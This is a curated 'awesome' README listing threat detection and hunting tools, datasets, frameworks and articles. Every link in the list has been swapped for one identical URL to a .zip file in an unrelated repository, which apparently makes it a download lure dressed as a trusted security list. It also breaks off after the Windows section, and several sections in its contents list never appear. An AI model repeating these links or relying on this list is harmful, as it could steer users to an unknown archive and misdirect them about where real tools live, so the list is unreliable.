# Awesome Threat Detection and Hunting
[![Awesome](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)

> A curated list of awesome threat detection and hunting resources


## Contents

- [Threat Detection and Hunting](#threat-detection-and-hunting)
    - [Tools](#tools)
        - [Alerting Engine](#alerting-engine)
        - [Endpoint Monitoring](#endpoint-monitoring)
        - [Network Monitoring](#network-monitoring)
             - [Fingerprinting Tools](#fingerprinting-tools)
    - [DataSet](#dataset)
    - [Resources](#resources)
        - [Frameworks](#frameworks)
        - [DNS](#dns)
        - [Command and Control](#command-and-control)
        - [Osquery](#osquery)
        - [Windows](#windows)
            - [Sysmon](#sysmon)
            - [PowerShell](#powershell)
        - [Fingerprinting](#fingerprinting)
        - [Research Papers](#research-papers)
        - [Blogs](#blogs)
    - [Videos](#videos)
    - [Trainings](#trainings)
    - [Twitter](#twitter)
- [Threat Simulation](#threat-simulation)
    - [Tools](#tools-1)
    - [Resources](#resources-1)
- [Contribute](#contribute)
- [License](#license)


## Threat Detection and Hunting


### Tools

- [MITRE ATT&CK Navigator](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)([source code](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)) - The ATT&CK Navigator is designed to provide basic navigation and annotation of ATT&CK matrices, something that people are already doing today in tools like Excel.
- [HELK](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A Hunting ELK (Elasticsearch, Logstash, Kibana) with advanced analytic capabilities.
- [osquery-configuration](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A repository for using osquery for incident detection and response.
- [DetectionLab](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Vagrant & Packer scripts to build a lab environment complete with security tooling and logging best practices.
- [Sysmon-DFIR](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Sources, configuration and how to detect evil things utilizing Microsoft Sysmon.
- [sysmon-config](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Sysmon configuration file template with default high-quality event tracing.
- [sysmon-modular](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A repository of sysmon configuration modules. It also includes a [mapping](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) of Sysmon configurations to MITRE ATT&CK techniques.
- [Revoke-Obfuscation](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - PowerShell Obfuscation Detection Framework.
- [Invoke-ATTACKAPI](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A PowerShell script to interact with the MITRE ATT&CK Framework via its own API.
- [Unfetter](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A reference implementation provides a framework for collecting events (process creation, network connections, Window Event Logs, etc.) from a client machine and performing CAR analytics to detect potential adversary activity.
- [Flare](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An analytical framework for network traffic and behavioral analytics.
- [RedHunt-OS](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A Virtual Machine for Adversary Emulation and Threat Hunting. RedHunt aims to be a one stop shop for all your threat emulation and threat hunting needs by integrating attacker's arsenal as well as defender's toolkit to actively identify the threats in your environment.
- [Oriana](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Lateral movement and threat hunting tool for Windows environments built on Django comes Docker ready.
- [Bro-Osquery](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Bro integration with osquery
- [Brosquery](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A module for osquery to load Bro logs into tables
- [DeepBlueCLI](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A PowerShell Module for Hunt Teaming via Windows Event Logs
- [Uncoder](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An online translator for SIEM saved searches, filters, queries, API requests, correlation and Sigma rules
- [Sigma](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Generic Signature Format for SIEM Systems
- [CimSweep](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A suite of CIM/WMI-based tools that enable the ability to perform incident response and hunting operations remotely across all versions of Windows
- [Dispatch](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An open-source crisis management orchestration framework
- [EQL](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Event Query Language
  - [EQLLib](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - The Event Query Language Analytics Library (eqllib) is a library of event based analytics, written in EQL to detect adversary behaviors identified in MITRE ATT&CK™.
- [BZAR](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) (Bro/Zeek ATT&CK-based Analytics and Reporting) - A set of Zeek scripts to detect ATT&CK techniques
- [Security Onion](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An open-source Linux distribution for threat hunting, security monitoring, and log management. It includes ELK, Snort, Suricata, Zeek, Wazuh, Sguil, and many other security tools
- [Varna](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A quick & cheap AWS CloudTrail Monitoring with Event Query Language (EQL)
- [BinaryAlert](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Serverless, real-time & retroactive malware detection
- [hollows_hunter](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Scans all running processes, recognizes and dumps a variety of potentially malicious implants (replaced/implanted PEs, shellcodes, hooks, in-memory patches).
- [ThreatHunting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A Splunk app mapped to MITRE ATT&CK to guide your threat hunts
- [Sentinel Attack](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A repository of Azure Sentinel alerts and hunting queries leveraging sysmon and the MITRE ATT&CK framework
- [Brim](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A desktop application to efficiently search large packet captures and Zeek logs
- [YARA](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - The pattern matching swiss knife
- [Intel Owl](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An Open Source Intelligence, or OSINT solution to get threat intelligence data about a specific file, an IP or a domain from a single API at scale.
- [Capa](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An open-source tool to identify capabilities in executable files.
- [Splunk Security Content](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) Splunk-curated detection content that can easily be used accross many SIEMs (see Uncoder Rule Converter.) 
- [Threat Bus](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Threat intelligence dissemination layer to connect security tools through a distributed publish/subscribe message broker.
- [VAST](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A network telemetry engine for data-driven security investigations.
- [zeek2es](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An open source tool to convert Zeek logs to Elastic/OpenSearch.  You can also output pure JSON from Zeek's TSV logs!

#### Alerting Engine

- [ElastAlert](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A framework for alerting on anomalies, spikes, or other patterns of interest from data in Elasticsearch
- [StreamAlert](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A serverless, realtime data analysis framework which empowers you to ingest, analyze, and alert on data from any environment, using datasources and alerting logic you define

#### Endpoint Monitoring

- [osquery](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) ([github](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)) - SQL powered operating system instrumentation, monitoring, and analytics
- [Kolide Fleet](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A flexible control server for osquery fleets
- [Zeek Agent](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An endpoint monitoring agent that provides host activity to Zeek
- [Velociraptor](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Endpoint visibility and collection tool
- [Sysdig](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A tool for deep Linux system visibility, with native support for containers. Think about sysdig as strace + tcpdump + htop + iftop + lsof + https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip sauce
- [go-audit](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An alternative to the Linux auditd daemon
- [Sysmon](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A Windows system service and device driver that monitors and logs system activity to the Windows event log
- [OSSEC](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An open-source Host-based Intrusion Detection System (HIDS)
- [WAZUH](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An open-source security platform
 
#### Network Monitoring

- [Zeek](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) (formerly Bro) - A network security monitoring tool
- [ntopng](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A web-based network traffic monitoring tool
- [Suricata](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A network threat detection engine
- [Snort](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) ([github](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)) - A network intrusion detection tool 
- [Joy](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A package for capturing and analyzing network flow data and intraflow data, for network research, forensics, and security monitoring
- [Netcap](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A framework for secure and scalable network traffic analysis
- [Moloch](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A large scale and open source full packet capture and search tool
- [Stenographer](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A full-packet-capture tool

##### Fingerprinting Tools

- [JA3](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A method for profiling SSL/TLS Clients and Servers
- [HASSH](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Profiling Method for SSH Clients and Servers
- [RDFP](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Zeek Remote desktop fingerprinting script based on [FATT](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) (Fingerprint All The Things)
- [FATT](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A pyshark based script for extracting network metadata and fingerprints from pcap files and live network traffic
- [FingerprinTLS](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A TLS fingerprinting method
- [Mercury](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Network fingerprinting and packet metadata capture
- [GQUIC Protocol Analyzer for Zeek](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Recog](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A framework for identifying products, services, operating systems, and hardware by matching fingerprints against data returned from various network probes
- [Hfinger](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Fingerprinting HTTP requests
- [JARM](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - An active Transport Layer Security (TLS) server fingerprinting tool.

### Dataset

- [Mordor](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Pre-recorded security events generated by simulated adversarial techniques in the form of JavaScript Object Notation (JSON) files. The data is categorized by platforms, adversary groups, tactics and techniques defined by the Mitre ATT&CK Framework.
- [https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)([github repo](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)) - Samples of security related data.
- [Boss of the SOC (BOTS) Dataset Version 1](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Boss of the SOC (BOTS) Dataset Version 2](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Boss of the SOC (BOTS) Dataset Version 3](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [EMBER](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) ([paper](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)) - The EMBER dataset is a collection of features from PE files that serve as a benchmark dataset for researchers
- [theZoo](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A repository of LIVE malwares
- [CIC Datasets](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Canadian Institute for Cybersecurity datasets
- [Netresec's PCAP repo list](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A list of public packet capture repositories, which are freely available on the Internet.
- [PCAP-ATTACK](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A repo of PCAP samples for different ATT&CK techniques.
- [EVTX-ATTACK-SAMPLES](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A repo of Windows event samples (EVTX) associated with ATT&CK techniques ([EVTX-ATT&CK Sheet](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)).


### Resources

- [Huntpedia](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Your Threat Hunting Knowledge Compendium
- [Hunt Evil](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Your Practical Guide to Threat Hunting
- [The Hunter's Handbook](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Endgame's guide to adversary hunting
- [ThreatHunter-Playbook](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A Threat hunter's playbook to aid the development of techniques and hypothesis for hunting campaigns.
- [The ThreatHunting Project](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A great [collection of hunts](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) and threat hunting resources.
- [CyberThreatHunting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A collection of resources for threat hunters.
- [Hunt-Detect-Prevent](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Lists of sources and utilities to hunt, detect and prevent evildoers.
- [Alerting and Detection Strategy Framework](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Generating Hypotheses for Successful Threat Hunting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Expert Investigation Guide - Threat Hunting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Active Directory Threat Hunting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Threat Hunting for Fileless Malware](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Windows Commands Abused by Attackers](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Deception-as-Detection](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Deception based detection techniques mapped to the MITRE’s ATT&CK framework.
- [On TTPs](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- Hunting On The Cheap ([Slides](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))
- [Threat Hunting Techniques - AV, Proxy, DNS and HTTP Logs](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Detecting Malware Beacons Using Splunk](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Data Science Hunting Funnel](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Use Python & Pandas to Create a D3 Force Directed Network Diagram](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Syscall Auditing at Scale](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Catching attackers with go-audit and a logging pipeline](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [The Coventry Conundrum of Threat Intelligence](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Signal the ATT&CK: Part 1](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Building a real-time threat detection capability with Tanium that focuses on documented adversarial techniques.
- SANS Summit Archives ([DFIR](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip), [Cyber Defense](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)) - Threat hunting, Blue Team and DFIR summit slides
- [Bro-Osquery](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Large-Scale Host and Network Monitoring Using Open-Source Software
- [Malware Persistence](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Collection of various information focused on malware persistence: detection (techniques), response, pitfalls and the log collection (tools).
- [Threat Hunting with Jupyter Notebooks](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [How Dropbox Security builds tools for threat detection and incident response](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Introducing Event Query Language](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [The No Hassle Guide to Event Query Language (EQL) for Threat Hunting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) ([PDF](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))
- [Introducing the Funnel of Fidelity](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) ([PDF](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))
- [Detection Spectrum](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) ([PDF](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))
- [Capability Abstraction](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) ([PDF](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))
- [Awesome YARA](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A curated list of awesome YARA rules, tools, and resources
- [Defining ATT&CK Data Sources](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A two-part blog series that outlines a new methodology to extend ATT&CK’s current data sources.
- [DETT&CT: MAPPING YOUR BLUE TEAM TO MITRE ATT&CK™](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A blog that describes how to align MITRE ATT&CK-based detection content with data sources.
- Detection as Code in Splunk [Part 1, ](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)[Part 2, ](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)[and Part 3](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A multipart series describing how detection as code can be successfully deployed in a Splunk environment.
- [Lessons Learned in Detection Engineering](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A well experienced detection engineer describes in detail his observations, challenges, and recommendations for building an effective threat detection program.

#### Frameworks

- [MITRE ATT&CK](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A curated knowledge base and model for cyber adversary behavior, reflecting the various phases of an adversary’s lifecycle and the platforms they are known to target.
- [MITRE CAR](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - The Cyber Analytics Repository (CAR) is a knowledge base of analytics developed by MITRE based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK™) adversary model.
- [Alerting and Detection Strategies Framework](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A framework for developing alerting and detection strategies.
- [A Simple Hunting Maturity Model](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - The Hunting Maturity Model describes five levels of organizational hunting capability, ranging from HMM0 (the least capability) to HMM4 (the most).
- [The Pyramic of Pain](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - The relationship between the types of indicators you might use to detect an adversary's activities and how much pain it will cause them when you are able to deny those indicators to them.
- [A Framework for Cyber Threat Hunting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [The PARIS Model](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A model for threat hunting.
- [Cyber Kill Chain](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - It is part of the Intelligence Driven Defense® model for identification and prevention of cyber intrusions activity. The model identifies what the adversaries must complete in order to achieve their objective.
- [The DML Model](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - The Detection Maturity Level (DML) model is a capability maturity model for referencing ones maturity in detecting cyber attacks.
- [NIST Cybersecurity Framework](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [OSSEM](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) (Open Source Security Events Metadata) - A community-led project that focuses on the documentation and standardization of security event logs from diverse data sources and operating systems
- [MITRE Shield](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A knowledge base of active defense techniques and tactics ([Active Defense Matrix](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip))
- [MaGMa Use Case Defintion Model](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A business-centric approach for planning and defining threat detection use cases.

#### DNS

- [Detecting DNS Tunneling](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Hunting the Known Unknowns (with DNS)](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Detecting dynamic DNS domains in Splunk](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Random Words on Entropy and DNS](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Tracking Newly Registered Domains](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip+Newly+Registered+Domains/23127)
- [Suspicious Domains Tracking Dashboard](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip+Domains+Tracking+Dashboard/23046/)
- [Proactive Malicious Domain Search](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip+Malicious+Domain+Search/23065/)
- [DNS is NOT Boring](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Using DNS to Expose and Thwart Attacks
- [Actionable Detects](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Blue Team Tactics

#### Command and Control

- [Rise of Legitimate Services for Backdoor Command and Control](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Watch Your Containers](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A malware using DogeCoin based DGA to generate C2 domain names.

##### DoH
- [Hiding in Plain Sight](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A malware abusing Google DoH
- [All the DoH](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A Twitter thread on malware families and utilities that use DNS-over-HTTPS.



#### Osquery

- [osquery Across the Enterprise](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [osquery for Security — Part 1](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [osquery for Security — Part 2](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - Advanced osquery functionality, File integrity monitoring, process auditing, and more.
- [Tracking a stolen code-signing certificate with osquery](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Monitoring macOS hosts with osquery](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Kolide's Blog](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [The osquery Extensions Skunkworks Project](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip%20Extensions)

#### Windows

- [Threat Hunting via Windows Event Logs](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Windows Logging Cheat Sheets](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Active Directory Threat Hunting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [Windows Hunting](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip) - A collection of Windows hunting queries
- [Windows Commands Abused by Attackers](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
- [JPCERT - Detecting Lateral Movement through Tracking Event Logs](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)
    - [Tool Analysis Result Sheet](https://raw.githubusercontent.com/joymondal/awesome-threat-detection/master/introspectivist/awesome-threat-detection.zip)

